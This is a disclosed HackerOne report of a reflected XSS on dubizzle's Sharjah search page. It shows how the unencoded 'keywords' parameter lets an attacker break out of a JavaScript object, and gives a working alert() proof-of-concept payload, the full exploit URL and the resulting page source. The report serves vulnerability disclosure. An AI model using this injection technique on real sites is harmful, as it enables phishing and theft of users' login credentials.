@@ -1,0 +1,84 @@
+ReportLink:https://hackerone.com/reports/363571
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/pajoda
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:16.12.2018 11:18:03
+
+Summary:
+
+Hi,
+
+I found a reflected XSS vulnerability on the search page of sharjah.dubizzle.com.
+Because the GET parameter `keywords` is not being encoded before parsing it into the JavaScript, an attacker can break out of the code an execute JavaScript in the targets browser.
+
+### Vulnerable Code
+
+When searching for `testtestfirsthackeronereport` (https://sharjah.dubizzle.com/search/?keywords=testtestfirsthackeronereport&is_basic_search_widget=1&is_search=1), the source of the page will look like the following:
+
+```
+var pageOptions = {
+	"query": "testtestfirsthackeronereport Sharjah",
+	"pubId": "partner-dubizzle-search",
+	"adPage": "1",
+	"location": false,
+	"hl": "en ",
+	"channel": "search",
+	"number": 4,
+	"sellerRatings": false,
+	"linkTarget": "_blank",
+        
+	"adsafe": "medium"
+};
+```
+
+Altering the search term to `test"` will result in the following output in the source of the page:
+
+```
+var pageOptions = {
+	"query": "test" Sharjah",
+	"pubId": "partner-dubizzle-search",
+	"adPage": "1",
+	"location": false,
+	"hl": "en ",
+	"channel": "search",
+	"number": 4,
+	"sellerRatings": false,
+	"linkTarget": "_blank",
+        
+	"adsafe": "medium"
+};
+```
+
+I decided to close the variable definiton, execute my code, and readd the exact same code, which has been executed before, again after running my code, so there won't be any JavaScript errors and the payload will be executed.
+
+### PoC
+
+The final payload is: `fghgfhgfh"}%3Balert('XSS Paul Dannewitz '%2Bdocument.domain)%3B var pageOptions %3D {"query"%3A "`
+URL: https://sharjah.dubizzle.com/search/?keywords=fghgfhgfh"}%3Balert('XSS%20Paul%20Dannewitz%20'%2Bdocument.domain)%3B%20var%20pageOptions%20%3D%20{"query"%3A%20"&is_basic_search_widget=1&is_search=1
+
+{F306774}
+
+The PoC will be parsed to:
+
+```
+var pageOptions = {
+	"query": "fghgfhgfh"};alert('XSS Paul Dannewitz'+document.domain); var pageOptions = {"query": " Sharjah",
+	"pubId": "partner-dubizzle-search",
+	"adPage": "1",
+	"location": false,
+	"hl": "en ",
+	"channel": "search",
+	"number": 4,
+	"sellerRatings": false,
+	"linkTarget": "_blank",
+        
+	"adsafe": "medium"
+};
+```
+
+## Impact
+
+The most simple thing an attacker could do is sending a malicious link to a dubizzle user, whichs redirects the user/victim to the attackers page - which is a dubizzle phishing site - via JavaScript and steal the login credentials. There are probably more creative ways of using the ability to run JavaScript in the victims browser on dubizzle.
